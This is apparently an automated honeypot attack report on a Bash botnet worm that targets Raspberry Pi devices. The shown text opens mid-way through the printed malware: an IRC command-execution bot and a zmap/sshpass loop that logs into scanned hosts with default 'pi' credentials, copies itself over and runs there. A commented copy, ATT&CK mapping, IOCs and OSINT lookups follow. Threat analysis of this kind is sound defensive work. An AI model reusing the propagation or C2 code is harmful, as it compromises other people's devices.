			privmsg_data=$(echo $msg_in| cut -d':' -f 4)
			privmsg_nick=$(echo $msg_in| cut -d':' -f 2 | cut -d'!' -f 1)

			hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F' ' '{print $1}'`
			sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`

			if [[ "$sign" == "$hash" ]] ; then
				CMD=`echo $privmsg_data | base64 -d -i`
				RES=`bash -c "$CMD" | base64 -w 0`
				eval 'printf "PRIVMSG $privmsg_nick :$RES\r\n" >&3;'
				if [[ ! "$?" -eq 0 ]] ; then
					break
				fi
			fi
		fi
	done
done
EOFMARKER

chmod +x /tmp/$BOT
nohup /tmp/$BOT 2>&1 > /tmp/bot.log &
rm /tmp/nohup.log -rf
rm -rf nohup.out
sleep 3
rm -rf /tmp/$BOT

NAME=`mktemp -u 'XXXXXXXX'`

date > /tmp/.s

apt-get update -y --force-yes
apt-get install zmap sshpass -y --force-yes

while [ true ]; do
	FILE=`mktemp`
	zmap -p 22 -o $FILE -n 100000
	killall ssh scp
	for IP in `cat $FILE`
	do
		sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
		sshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
	done
	rm -rf $FILE
	sleep 10
done

fi



```
2 more samples with the same **Standardized** Sha256 HASH were found:

* `1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51`
* `b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f`


</details>

---


### Commented Malware Sample & Explanation

<details>
<summary>
<h4>
Standardized Malware Sample 0/1 Sha256 HASH: f7bbaf20a0b5d98b0e333ae777118fd19a1c26ff47c5fd063e4c1933dc0b22fc</h4>
</summary>


```bash
# This script is a Bash script generally used for malicious activities such as
# establishing persistence, killing processes, modifying system configurations,
# and spreading itself to other systems.

# A special header to denote this script as a stand-alone bash executable
C0755 4745 X
#!/bin/bash

# Set variable MYSELF to the path of the current script
MYSELF=`realpath $0`
# DEBUG variable pointing to /dev/null, effectively disabling debug output
DEBUG=/dev/null
# Log the script path to the debug output
echo $MYSELF >> $DEBUG

# Check if the effective user ID is not equal to zero (not root)
if [ "$EUID" -ne 0 ]
then 
	# Generate a random string for a new script name
	NEWMYSELF=`mktemp -u 'XXXXXXXX'`
	# Copy the current script to /opt with the new name and elevate permissions with sudo
	sudo cp $MYSELF /opt/$NEWMYSELF
	# Clear /etc/rc.local and add a line to execute the script on startup with sudo
	sudo sh -c "echo '#!/bin/sh -e' > /etc/rc.local"
	sudo sh -c "echo /opt/$NEWMYSELF >> /etc/rc.local"
	sudo sh -c "echo 'exit 0' >> /etc/rc.local"
	# Sleep for 1 second to apply changes
	sleep 1
	# Reboot the system to trigger the changes with sudo
	sudo reboot
else
# If script is running as root, execute the following block
	# Create a temporary file and log its name to debug
	TMP1=`mktemp`
	echo $TMP1 >> $DEBUG

	# Kill numerous processes that may interfere with the script's activities
	killall bins.sh
	killall minerd
	... (many other 'killall' commands omitted for brevity) ...
	killall perl

	# Modify /etc/hosts to prevent system from accessing certain domains
	echo "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts
	# Remove a pair of .bashrc files to likely disable environment setup
	rm -rf /root/.bashrc
	rm -rf /home/pi/.bashrc

	# Change the password of the 'pi' user to a hardcoded hash
	usermod -p \$6\$vGkGPKUr\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi

	... (additional malicious activities omitted for brevity) ...

	# Infinite loop to infect other systems
	while [ true ]; do
		... (code to spread the malware to other systems via ssh omitted for brevity) ...
	done

fi

# Null character at the end of the script


```

</details>

---

The script provided is a `Bash` shell script that appears to be designed to perform various malicious activities. The sample code starts by attempting to gain root access to the system. If run by a non-root user, the script attempts to copy itself to `/opt`, make changes to `/etc/rc.local` to ensure it executes on every reboot, and then forces the system to reboot.

If the script is run as root, it executes a payload of various malicious activities:
1. Kills numerous processes, including other instances of mining or bot software, which indicates the malware wants to be the only malicious actor on the system.
2. Alters `/etc/hosts` to block the system from contacting specific domains, likely to disrupt communications with other malicious actors or updating mechanisms.
3. Removes `.bashrc` scripts likely to prevent administrators from setting up a secure environment on login.
4. Modifies the 'pi' user's password, effectively locking out the legitimate user.
5. Adds an SSH key to the `root` user's `.ssh/authorized_keys` file to maintain backdoor access.
6. Contains hard-coded public keys to verify commands received from a command and control server.
7. Sets up a bot that connects to an IRC server, listens for commands that are verified with a public key, and executes them.
8. Iteratively uses `zmap` to find more systems with open SSH ports, then attempts to SSH into them using default Raspberry Pi credentials to spread itself.

The attackers use the `scp` and `bash` commands to deploy and execute the malware script on the target honeypot system, likely targeting multiple machines for a coordinated attack or botnet formation.

Finally, the malware contains an endless loop to continue scanning and attempting to infect new systems. This malware is designed for persistence, self-propagation, and provides a method for remote control, which are common characteristics of botnets. It also appears to be targeting Raspberry Pi devices specifically, as indicated by the default `pi` username and related credentials.

# Which vulnerability does the attack attempt to exploit?
The search against ExploitDB using the provided texts did not return any specific exploits associated with the text "ssh pi default password," "sudo reboot," "scp -o ConnectTimeout=," or "zmap." This could imply that the attack did not leverage a specific known vulnerability with an assigned CVE number or that the exploit is not listed in the ExploitDB database.

The nature of the attack does not appear to be based on exploiting a single specific software vulnerability but rather on the exploitation of configuration weaknesses such as:

- Use of default or weak passwords for SSH access (a common issue with devices where the default credentials are not changed).
- Misconfigured `sudoers` file allowing unauthorized operations without a password or with a default known password.

The attackers were able to exploit these security misconfigurations to gain unauthorized access, escalate privileges, maintain persistence, and deploy malware. 

In the absence of specific CVEs and exploit code, it's possible that the attack vector was purely based on the exploitation of poor security practices rather than a known software vulnerability. However, it's also worth noting that not all exploits are necessarily present in public databases like ExploitDB, especially if the attack utilizes private or previously undisclosed methods.


# MITRE ATT&CK
The MITRE ATT&CK framework provides a comprehensive matrix of tactics and techniques used by threat actors during the phases of their cyber attack lifecycle. Based on the information gathered about this attack on the Linux honeypot, the following MITRE ATT&CK tactics and techniques can be used to classify the attack:

1. **Initial Access (Tactic TA0001):**
   - **Technique T1078 (Valid Accounts)**: The use of default SSH credentials (username `pi` with passwords `raspberry` and `raspberryraspberry993311`) to gain initial access to the system.

2. **Execution (Tactic TA0002):**
   - **Technique T1059 (Command and Scripting Interpreter)**: The execution of a bash shell script to execute commands and propagate the malware (`./BUwTrLEj`).

3. **Persistence (Tactic TA0003):**
   - **Technique T1068 (Exploitation for Privilege Escalation)**: Attempts to achieve persistence via `sudo` privilege escalation and modifying the system's `rc.local` file for reboot persistence.
   - **Technique T1098 (Account Manipulation)**: Modifying user credentials for the `pi` user to ensure maintained access.

4. **Privilege Escalation (Tactic TA0004):**
   - **Technique T1068 (Exploitation for Privilege Escalation)**: Similar to Persistence, using `sudo` to copy the malware to a privileged directory and ensure execution as root.

5. **Defense Evasion (Tactic TA0005):**
   - **Technique T1027 (Obfuscated Files or Information)**: Likely use of obfuscation or encoding techniques within the malicious script to hide the true intent of the payload.
   - **Technique T1112 (Modify Registry)**: Although not directly touching the Windows Registry, this technique is analogous to the modification of startup scripts in Linux (`rc.local` and `.bashrc` modifications).

6. **Credential Access (Tactic TA0006):**
   - **Technique T1110 (Brute Force)**: Usage of `sshpass` and `zmap` to perform brute force attacks against other SSH servers.

7. **Discovery (Tactic TA0007):**
   - **Technique T1046 (Network Service Scanning)**: Using `zmap` to scan the internet for exposed SSH services (port 22) as potential targets.

8. **Lateral Movement (Tactic TA0008):**
   - **Technique T1021 (Remote Services)**: The SSH login attempts to spread the malware to additional hosts once initial access was obtained.

9. **Collection (Tactic TA0009):**
   - Potentially relevant if data collection activities were identified during the analysis, though none were explicitly mentioned.

10. **Command and Control (Tactic TA0011):**
    - **Technique T1071 (Application Layer Protocol)**: Using IRC as command and control (C2) communication channel.

11. **Exfiltration (Tactic TA0010):**
    - Not explicitly mentioned, but if the script exfiltrated data, it could be included here.

12. **Impact (Tactic TA0040):**
    - **Technique T1485 (Data Destruction)**: The removal of `.bashrc` and other files could be considered a form of data destruction.

This classification covers a broad range of activities from the attack lifecycle, from gaining initial access to maintaining presence on compromised systems and potentially spreading across the network. It highlights the multi-faceted nature of the attack and the various areas where improvements in defensive measures could be implemented.

# What Is The Goal Of The Attack?
The goal of the attack on the Linux honeypot appears to be multifaceted, involving several objectives:

1. **Unauthorized Access and Control:**
   - Gain initial access to a system using default or weak SSH credentials. This enables the attacker to execute commands and deploy malware for control over the compromised system.

2. **Persistence and Privilege Escalation:**
   - Establish persistence by adding the malware to startup routines and elevating privileges to maintain long-term access. This suggests intent to secure control over the system across reboots and potential system administration activities.

3. **Malware Deployment:**
   - Install and execute malware to perform unauthorized actions, such as joining a botnet for coordinated activities or performing further malicious operations.

4. **Propagation and Expansion of Attack Surface:**
   - Use the compromised system as a launchpad for scanning and infecting other vulnerable systems on the internet, effectively expanding the botnet or the network of compromised hosts.

5. **Botnet Participation:**
   - Connect to an IRC server and wait for commands, indicating the infected system was part of a botnet, which could be leveraged for various coordinated attacks such as DDoS attacks, spreading spam, or further malware distribution.

6. **Credential Theft and Lateral Movement:**
   - Change the password of the user `pi` to maintain unauthorized access and potentially move laterally across the network by compromising more systems.

7. **Resource Hijacking:**
   - Kill processes related to other malicious activities, suggesting the attacker's intent to free up system resources potentially for cryptocurrency mining or to ensure their malware remains the predominant unauthorized software on the compromised system.

8. **Data Destruction and Defense Evasion:**
   - Modify system files (`/etc/hosts`, `.bashrc`, etc.) and network settings (DNS configuration) to hide their activity and potentially disrupt the normal operation of system utilities and security software.

Overall, the attack exhibits the characteristics of seeking to achieve ongoing unauthorized access, exploit system resources, conduct malicious cyber activities, and potentially perform financial theft or sabotage. The deployment of a botnet functionality also hints at collective capabilities for larger scale nefarious activities orchestrated by the attacker.

# If The System Is Vulnerable, Would The Attack Will Be Successful?
Based on the details of the attack, its success largely depends on the exploitation of weak security practices rather than specific software vulnerabilities. The key factors that could have made the system vulnerable, and thereby susceptible to a successful attack, include:

1. **Default or Weak Credentials:** If the system was using default usernames and passwords (such as `pi:raspberry`), the attacker's brute force or credential stuffing attempts would likely succeed, granting them initial access.

2. **Lack of Proper User Permission Configurations:** If users are improperly configured to have more privileges than necessary, especially the ability to execute commands via `sudo` without authentication, attackers can easily escalate their privileges.

3. **Inadequate Security Monitoring and Response:** Without security monitoring solutions that detect and respond to unusual activity (such as multiple failed login attempts or the sudden addition of SSH keys), the attack could proceed unnoticed.

4. **Exposure to Internet:** If services like SSH are unnecessarily exposed to the internet, especially with weak credentials, the risk of a successful attack increases significantly.

5. **Insufficient Host-based Security Controls:** Lacking firewalls, access controls, and file integrity monitoring can leave a system exposed to changes in critical files like `.bashrc` or `/etc/rc.local`, which attackers can exploit to establish persistence.

6. **Failure to Isolate and Segment Networks:** If the system is directly accessible from the internet without being segmented or isolated within a network, it's easier for attackers to move laterally after compromising the system.

7. **Unrestricted Outbound Connections:** If the network allows unrestricted outbound connections, it can be used by the malware to connect to external command and control servers, as seen with the IRC server connection.

In the absence of these vulnerabilities, the system's security measures would likely prevent at least some stages of the attack from being successful. For example, strong, unique credentials would prevent initial SSH access, proper user privilege configurations would stop unauthorized `sudo` actions, and active monitoring would detect and potentially stop malicious activities.

Even if a system has technical vulnerabilities, it may not fall victim to an attack if it has robust security policies and practices in place. This includes regular security audits, the principle of least privilege for user accounts, network segmentation, use of intrusion detection and prevention systems (IDS/IPS), timely patch management, and comprehensive monitoring and response strategies.

# How Can A System Be Protected From This Attack?
To protect a system from this type of attack, multiple security measures should be implemented, focusing on prevention, detection, and response. Here are some ways to safeguard a system:

1. **Use Strong, Unique Credentials:**
   - Implement strong password policies and avoid using default credentials.
   - Regularly rotate passwords and encourage the use of password managers.

2. **Implement Two-Factor Authentication (2FA):**
   - Enable 2FA wherever possible to add an extra layer of security on top of passwords.

3. **Privilege Management:**
   - Practice the principle of least privilege, ensuring users have only the necessary access rights.
   - Restrict `sudo` privileges and monitor `sudoers` file changes.

4. **Regularly Update and Patch Systems:**
   - Keep all system software up to date with the latest security patches to mitigate known vulnerabilities.

5. **Harden SSH Configuration:**
   - Disable root login over SSH.
   - Use SSH keys for authentication rather than passwords, if possible.
   - Limit SSH access to known IP addresses through firewall rules or SSH configuration.

6. **Network Security:**
   - Use firewalls to block unnecessary inbound and outbound connections.
   - Implement network segmentation to isolate critical systems and limit lateral movement.
   - Monitor network traffic for abnormal patterns that could indicate an attack.

7. **Host-Based Security Measures:**
   - Install and configure intrusion detection systems (IDS) and intrusion prevention systems (IPS).
   - Use security software to monitor for and quarantine suspicious files.
   - Regularly scan systems for malware and vulnerabilities.

8. **File Integrity Monitoring:**
   - Implement tools to monitor critical system files for unauthorized changes.

9. **User Activity Monitoring:**
   - Monitor and alert on suspicious user activities, such as multiple failed login attempts or unexpected privilege escalations.

10. **Backup and Disaster Recovery:**
    - Maintain regular and secure backups of critical data.
    - Develop and test a disaster recovery plan to ensure business continuity in case of a successful breach.

11. **Security Training and Awareness:**
    - Provide regular security training to all users, focusing on recognizing and reporting phishing attempts, malware, and other security threats.

12. **Incident Response Plan:**
    - Establish and periodically test an incident response plan to quickly and effectively handle potential security breaches.

Implementing these measures can significantly reduce the risk of a successful attack, both from the specific techniques used in this scenario and from a broad range of other potential vulnerabilities and threat actors.

# What Are The Indicators Of Compromise (Iocs) For This Attack?
Indicators of Compromise (IOCs) are forensic data that help identify potentially malicious activity on a system or network. For the attack described, the following IOCs can be considered:

1. **Source IP Addresses:**
   - 93.223.169.159
   - 27.93.25.111
   - 111.216.194.148

2. **Malicious File Hashes:**
   - 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
   - 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51
   - b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f

3. **Suspicious Files and Filepaths:**
   - /tmp/BUwTrLEj (or other randomly named files in /tmp)
   - Any files added to /opt/ with unusual names
   - Changes or additions to /root/.ssh/authorized_keys

4. **Malware Artifacts:**
   - The presence of bash scripts similar to the one described in the malware analysis that includes persistence mechanisms, botnet activity, and self-propagation code.

5. **Suspicious System Changes:**
   - Modifications to `/etc/rc.local` file.
   - Unexplained reboots of the system.
   - Removal or alteration of `/root/.bashrc` and `/home/pi/.bashrc`.
   - Unauthorized changes to the `pi` user's password or other accounts.

6. **Unexpected Network Traffic:**
   - Outgoing connections to unusual IRC servers.
   - Large volumes of outgoing SSH traffic especially using common usernames and passwords.
   - Network scanning traffic originating from the infected system, particularly on port 22 (SSH).

7. **Command and Control Activity:**
   - Traffic patterns indicating communication with a command and control server, especially if using IRC protocols.

8. **Compromised Process Behavior:**
   - Processes that are terminating other processes en masse, particularly those named with keywords included in the malware payload (e.g., minerd, kaiten).

These IOCs can be used for active monitoring and for conducting retrospective incident analysis to identify if a system has been compromised by this specific attack or something similar. It is important to integrate these IOCs into intrusion detection systems, security information and event management (SIEM) systems, and endpoint protection platforms to help in the early detection of a breach.

# What do you know about the attacker?
The critical findings across all OSINT sources for the IP addresses and malware involved in the attack on the Linux honeypot can be summarized as follows:

### IP Addresses:
- There were three primary source IPs identified: **93.223.169.159 (Germany), 27.93.25.111 (Japan), and 111.216.194.148 (Japan)**, which were involved in targeting the honeypot server.
- These IPs have been reported engaging in malicious activity, including attacks on other honeypots and SSH brute force attacks.
- They have been listed on various threat feeds and blocklists, suggesting a history of suspicious activities.
- Shodan data showed that at least one of the IPs was running common services like OpenSSH and Apache HTTPD, which could indicate compromised systems being used as part of an attack infrastructure.
- ISC reported that these IPs have repeatedly targeted honeypots, have been active over several months, and are associated with large network providers.

### Malware:
- A Linux trojan with hash **10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c** was identified, distributed by the IP **93.223.169.159**, and has been found on MalwareBazaar.
- The malware was noted for a file size of 4766 bytes and the MIME type `application/octet-stream`, potentially indicating a shell script.
- The malware is detected by ClamAV and was listed as suspicious by Spamhaus HBL.
- ReversingLabs tagged it as "Linux.Trojan.Generic" and flagged it as suspicious with a 64.29% detection rate by scanning services.
- There was no additional data found on ThreatFox or URLhaus for the other two malware hashes, suggesting they might be less known or newly developed samples.

### Attack Methodology:
- Attackers used common usernames and passwords for SSH login attempts, which indicates a likely reliance on default or commonly used credentials.
- The consistent SSH hassh across sessions indicates the use of the same SSH client.
- Sessions included both successful and unsuccessful login attempts.
- Some successful sessions involved command executions and the transfer of malware.

The summary of findings illustrates a coordinated attack likely involving automated scripts or bots to compromise systems using default credentials, followed by the deployment of malware once access was gained. The identified malware points to the use of trojanized utilities or scripts, targeting Linux systems for malicious purposes. The reported activities across these OSINT sources suggest an established threat behavior associated with these actors and their infrastructure.

<details>
<summary>
<h2>IP Locations</h2>
</summary>


### IP Locations Summary
The locations of the IP addresses involved in the attack are summarized below:

### IP: 93.223.169.159
- **Geolocation:** Frankfurt am Main, Hessen, Germany
- **Network:** AS3320, Deutsche Telekom Ag (business)
- **Security Risks:** Malicious/attacker activity, abuse/bot activity
- **OSINT Data:**
  - Found in threat feeds for malicious activities and SSH brute force.
  - Reported in 492 different reports by 213 users on AbuseIPDB.
  - Last reported on February 3, 2024, as malicious and scanning the Internet.
  - Found in multiple blocklists.

### IP: 27.93.25.111
- **Geolocation:** Hiroshima, Hiroshima (Hiroshima), Japan
- **Network:** AS2516, KDDI Corporation (business)
- **Security Risks:** Malicious/attacker activity, abuse/bot activity
- **OSINT Data:**
  - Found in threat feeds for SSH brute force attacks.
  - Reported in 1060 different reports by 373 users on AbuseIPDB.
  - Last reported on February 2, 2024, as malicious and scanning the Internet.
  - Found in multiple blocklists.
  - Running services observed on Shodan: OpenSSH, Apache HTTPD.

### IP: 111.216.194.148
- **Geolocation:** Yokohama, Kanagawa, Japan
- **Network:** AS2527, Sony Network Communications Inc (business)
- **Security Risks:** Malicious/attacker activity, abuse/bot activity
- **OSINT Data:**
  - Found in threat feeds for SSH brute force attacks.
  - Reported in 449 different reports by 208 users on AbuseIPDB.
  - Last reported on February 3, 2024, as malicious and scanning the Internet.
  - Found in multiple blocklists.
  - Running services observed on Shodan: OpenSSH, NETBIOS, RDP (Remote Desktop Protocol), HTTPS.

The threat actors behind these IP addresses seem to be associated with malicious internet activities, including brute force attacks on SSH services, and are listed in several threat feeds and blocklists indicating a history of offensive activities. These IPs are from business-oriented networks owned by major Telcos in Germany and Japan.

* This attack involved `3` unique IP addresses. `3` were source IPs.`0` unique IPs and `0` unique URLS were found in the commands.`0` unique IPs and `0` unique URLS were found in malware.
* The most common **Country** of origin was `Japan`, which was seen `2` times.
* The most common **City** of origin was `Frankfurt am Main`, which was seen `1` times.
* The most common **ISP** of origin was `Deutsche Telekom AG`, which was seen `1` times.
* The most common **Organization** of origin was `Deutsche Telekom AG`, which was seen `1` times.
* The most common **ASN** of origin was `AS3320`, which was seen `1` times.
* The most common **network** of origin was `93.192.0.0/10`, which was seen `1` times.


| IP Address | Country | City | ISP | Organization | ASN | Network |
| --- | --- | --- | --- | --- | --- | --- |
| 27.93.25.111 | Japan | Kure | KDDI CORPORATION | KDDI CORPORATION | AS2516 | 27.93.0.0/16 |
| 111.216.194.148 | Japan | Urayasu | Sony Network Communications Inc. | So-net Service | AS2527 | 111.216.0.0/15 |
| 93.223.169.159 | Germany | Frankfurt am Main | Deutsche Telekom AG | Deutsche Telekom AG | AS3320 | 93.192.0.0/10 |

</details>

---


<details>
<summary>
<h2>CyberGordon</h2>
</summary>


### CyberGordon Results Summary
Based on CyberGordon data, the following is known about the IP addresses involved in the attack:

### IP: 93.223.169.159
- **Geolocation:** Frankfurt am Main, Hessen, Germany
- **Network:** AS3320, Deutsche Telekom AG (business)
- **Security Risks:** Noted for malicious/attacker activity and abuse/bot activity
- **Blocklists:** Listed on various blocklists including those by Charles Haley, DataPlane.org, James Brine, and the Scriptz Team.
- **OSINT Sources:**
  - Identified as high-risk on webroot.com.
  - Listed for brute force and scanning activities on dataplane.org and blocklist.de.
  - Reported for malicious activities in multiple other sources including GreyNoise and AbuseIPDB.

### IP: 27.93.25.111
- **Geolocation:** Hiroshima, Hirosima (Hiroshima), Japan
- **Network:** AS2516, KDDI Corporation (business)
- **Security Risks:** Malicious/attacker activity, abuse/bot activity
- **Blocklists:** Featured on Anti-attacks.com, Charles Haley, DataPlane.org, Interserver.net, James Brine.
- **OSINT Sources:**
  - Identified as high-risk on webroot.com.
  - Listed for brute force and scanning activities on dataplane.org and blocklist.de.
  - Reported for malicious activities in multiple other sources including GreyNoise and AbuseIPDB.

### IP: 111.216.194.148
- **Geolocation:** Yokohama, Kanagawa, Japan
- **Network:** AS2527, Sony Network Communications Inc (business)
- **Security Risks:** Malicious/attacker activity, abuse/bot activity
- **Blocklists:** Included in Anti-attacks.com, DataPlane.org, and James Brine.
- **OSINT Sources:**
  - Identified as high-risk on webroot.com.
  - Listed for brute force and scanning activities on dataplane.org and blocklist.de.
  - Reported for malicious activities in multiple other sources including GreyNoise and AbuseIPDB.

The data from CyberGordon corroborates the findings from other sources, indicating that these IP addresses are associated with suspicious or malicious behavior, and they are listed in multiple security-related blocklists and threat intelligence sources. This further confirms a pattern of attack behavior from these IPs, as they're linked with various types of malicious activities, especially related to network abuse and bot activity.

* `32` total alerts were found across all engines.
* `18` were **high** priority. 
* `8` were **medium** priority. 
* `6` were **low** priority. 
* The IP address with the **most high priority alerts** was `93.223.169.159` with `6` alerts.


| IP Addresss | Alerts High \| Med \| Low | [E1] IPinfo | [E2] AbuseIPDB | [E7] Google DNS | [E11] DShield/ISC | [E12] AlienVault OTX | [E17] Pulsedive | [E23] Offline Feeds | [E24] BlackList DE | [E26] MetaDefender | [E33] GreyNoise | [E34] IPdata.co |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 27.93.25.111 | `6` \| `3` \| `2` | <details>`Geo: Kure, Hiroshima, JP. Network: AS2516 KDDI CORPORATION. Hostname: kd027093025111.ppp-bb.dion.ne.jp. `<summary>`low`</summary></details> | <details>`Hostname(s): KD027093025111.ppp-bb.dion.ne.jp. ISP: KDDI Corporation. Usage: None. Risk 100%. 1060 report(s) by 373 user(s), last on 03 February 2024  `<summary>`high`</summary></details> | <details>`Current DNS PTR record(s): KD027093025111.ppp-bb.dion.ne.jp. `<summary>`low`</summary></details> | <details>`Found in 17 report(s) listing 4 target(s), last on 2 Feb 2024 `<summary>`high`</summary></details> | <details>`Found in 16 pulse-feed(s) `<summary>`medium`</summary></details> | <details>`Risk: none. Last seen on 1 Feb 2024. Found in threat list(s): SSH Brute Force. Found in feed list(s): Blocklist.de Blocklist, Dictionary SSH Attacks, Brute Force Hosts. Opened service(s): HTTP, SSH. `<summary>`medium`</summary></details> | <details>`Found in Duggy Tuxy - EU Botnets/Zombies/Scanners `<summary>`medium`</summary></details> | <details>`Found in 64 attack(s) and 29 report(s) `<summary>`high`</summary></details> | <details>`Found in 3 sources: webroot.com (high risk), dataplane.org (bruteforce, scanner), blocklist.de (scanner) `<summary>`high`</summary></details> | <details>`Last report on 03 February 2024 as malicious and scanning the Internet in the last 3 months. `<summary>`high`</summary></details> | <details>`Geo: Hiroshima, Hirosima (Hiroshima), Japan. Network: AS2516, KDDI Corporation, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Anti-attacks.com, Charles Haley, DataPlane.org, Interserver.net, James Brine. `<summary>`high`</summary></details> |
| 111.216.194.148 | `6` \| `3` \| `2` | <details>`Geo: Urayasu, Tokyo, JP. Network: AS2527 Sony Network Communications Inc.. Hostname: fp6fd8c294.ap.nuro.jp. `<summary>`low`</summary></details> | <details>`Hostname(s): fp6fd8c294.ap.nuro.jp. ISP: Sony Network Communications Inc.. Usage: None. Risk 100%. 449 report(s) by 208 user(s), last on 03 February 2024  `<summary>`high`</summary></details> | <details>`Current DNS PTR record(s): fp6fd8c294.ap.nuro.jp. `<summary>`low`</summary></details> | <details>`Found in 11 report(s) listing 4 target(s), last on 2 Feb 2024 `<summary>`high`</summary></details> | <details>`Found in 7 pulse-feed(s) `<summary>`medium`</summary></details> | <details>`Risk: low. Last seen on 2 Feb 2024. Found in feed list(s): Blocklist.de Blocklist, Brute Force Hosts. Opened service(s): HTTPS, NETBIOS, RDP, SSH. `<summary>`medium`</summary></details> | <details>`Found in IPsum (3+ blocklists) `<summary>`medium`</summary></details> | <details>`Found in 27 attack(s) and 16 report(s) `<summary>`high`</summary></details> | <details>`Found in 3 sources: webroot.com (high risk), dataplane.org (bruteforce, scanner), blocklist.de (scanner) `<summary>`high`</summary></details> | <details>`Last report on 03 February 2024 as malicious and scanning the Internet in the last 3 months. `<summary>`high`</summary></details> | <details>`Geo: Yokohama, Kanagawa, Japan. Network: AS2527, Sony Network Communications Inc, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Anti-attacks.com, DataPlane.org, James Brine. `<summary>`high`</summary></details> |
| 93.223.169.159 | `6` \| `2` \| `2` | <details>`Geo: Frankfurt am Main, Hesse, DE. Network: AS3320 Deutsche Telekom AG. Hostname: p5ddfa99f.dip0.t-ipconnect.de. `<summary>`low`</summary></details> | <details>`Hostname(s): p5ddfa99f.dip0.t-ipconnect.de. ISP: Deutsche Telekom AG. Usage: None. Risk 100%. 492 report(s) by 213 user(s), last on 03 February 2024  `<summary>`high`</summary></details> | <details>`Current DNS PTR record(s): p5ddfa99f.dip0.t-ipconnect.de. `<summary>`low`</summary></details> | <details>`Found in 11 report(s) listing 2 target(s), last on 1 Feb 2024 `<summary>`high`</summary></details> | <details>`Found in 6 pulse-feed(s) `<summary>`medium`</summary></details> | <details>`Risk: none. Last seen on 1 Feb 2024. Found in threat list(s): SSH Brute Force. Found in feed list(s): Blocklist.de Blocklist, Dictionary SSH Attacks, Brute Force Hosts. `<summary>`medium`</summary></details> | None | <details>`Found in 28 attack(s) and 22 report(s) `<summary>`high`</summary></details> | <details>`Found in 3 sources: webroot.com (high risk), dataplane.org (bruteforce, scanner), blocklist.de (scanner) `<summary>`high`</summary></details> | <details>`Last report on 03 February 2024 as malicious and scanning the Internet in the last 3 months. `<summary>`high`</summary></details> | <details>`Geo: Frankfurt am Main, Hessen, Germany. Network: AS3320, Deutsche Telekom Ag, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Charles Haley, DataPlane.org, James Brine, Scriptz Team. `<summary>`high`</summary></details> |

### CyberGordon Results

<details>
<summary>
<h3>Cybergordon results for: 93.223.169.159</h3>
</summary>


### Cybergordon results for: 93.223.169.159 [https://cybergordon.com/r/8e5afc2c-5af8-443e-a888-6111a77da92d](https://cybergordon.com/r/8e5afc2c-5af8-443e-a888-6111a77da92d)

| Engine | Results | Url |
| --- | --- | --- |
| [E34] IPdata.co | Geo: Frankfurt am Main, Hessen, Germany. Network: AS3320, Deutsche Telekom Ag, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Charles Haley, DataPlane.org, James Brine, Scriptz Team.  | https://ipdata.co |
| [E26] MetaDefender | Found in 3 sources: webroot.com (high risk), dataplane.org (bruteforce, scanner), blocklist.de (scanner)  | https://metadefender.opswat.com |
| [E2] AbuseIPDB | Hostname(s): p5ddfa99f.dip0.t-ipconnect.de. ISP: Deutsche Telekom AG. Usage: None. Risk 100%. 492 report(s) by 213 user(s), last on 03 February 2024   | https://www.abuseipdb.com/check/93.223.169.159 |
| [E33] GreyNoise | Last report on 03 February 2024 as malicious and scanning the Internet in the last 3 months.  | https://viz.greynoise.io/ip/93.223.169.159 |
| [E24] BlackList DE | Found in 28 attack(s) and 22 report(s)  | https://www.blocklist.de/en/search.html?ip=93.223.169.159 |
| [E11] DShield/ISC | Found in 11 report(s) listing 2 target(s), last on 1 Feb 2024  | https://isc.sans.edu/ipinfo.html?ip=93.223.169.159 |
| [E17] Pulsedive | Risk: none. Last seen on 1 Feb 2024. Found in threat list(s): SSH Brute Force. Found in feed list(s): Blocklist.de Blocklist, Dictionary SSH Attacks, Brute Force Hosts.  | https://pulsedive.com/browse |
| [E12] AlienVault OTX | Found in 6 pulse-feed(s)  | https://otx.alienvault.com/indicator/ip/93.223.169.159 |
| [E1] IPinfo | Geo: Frankfurt am Main, Hesse, DE. Network: AS3320 Deutsche Telekom AG. Hostname: p5ddfa99f.dip0.t-ipconnect.de.  | https://ipinfo.io/93.223.169.159 |
| [E7] Google DNS | Current DNS PTR record(s): p5ddfa99f.dip0.t-ipconnect.de.  | https://dns.google/query?name=159.169.223.93.in-addr.arpa&type=PTR |

</details>

---


<details>
<summary>
<h3>Cybergordon results for: 27.93.25.111</h3>
</summary>


